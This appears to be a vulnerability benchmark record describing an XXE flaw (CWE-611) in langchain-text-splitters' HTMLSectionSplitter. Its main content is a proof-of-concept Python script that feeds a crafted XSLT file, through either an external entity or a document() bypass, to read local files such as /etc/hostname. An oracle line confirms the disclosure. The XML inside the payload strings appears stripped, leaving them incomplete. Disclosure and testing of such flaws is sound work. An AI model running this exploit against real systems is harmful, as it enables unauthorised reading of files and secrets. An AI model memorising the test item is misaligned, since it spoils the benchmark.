title: XXE vulnerability in HTMLSectionSplitter due to unsafe XSLT parsing with lxml.etree.parse and lxml.etree.XSLT
cwe: CWE-611: Improper Restriction of XML External Entity Reference
trigger_payload:
#!/usr/bin/env python3 """ Reproduces XXE in langchain-text-splitters.HTMLSectionSplitter ✧ Works on both lxml ≤ 4.9 (entity) and ≥ 5.0 (document()). """ from pathlib import Path from tempfile import NamedTemporaryFile from langchain_text_splitters import HTMLSectionSplitter HTML = "

demo

" # --- choose ONE payload depending on lxml version --- # 1) Classic entity (lxml 4.9 and earlier) ENTITY_POC = """ ]>

XXE

&etc;
 """ # 2) document() bypass (lxml 5.0+) DOC_POC = """

XXE

 """ payload = DOC_POC # ← swap to ENTITY_POC if testing lxml 4.9.x with NamedTemporaryFile("w", suffix=".xslt") as f: f.write(payload); f.flush() splitter = HTMLSectionSplitter([("h1", "H")], xslt_path=f.name) out = splitter.split_text(HTML) print("=== XXE result ===") for chunk in out: print(getattr(chunk, "page_content", chunk))
oracle: The script prints the contents of /etc/hostname (or any other file referenced) inside the transformed HTML, confirming arbitrary file disclosure.
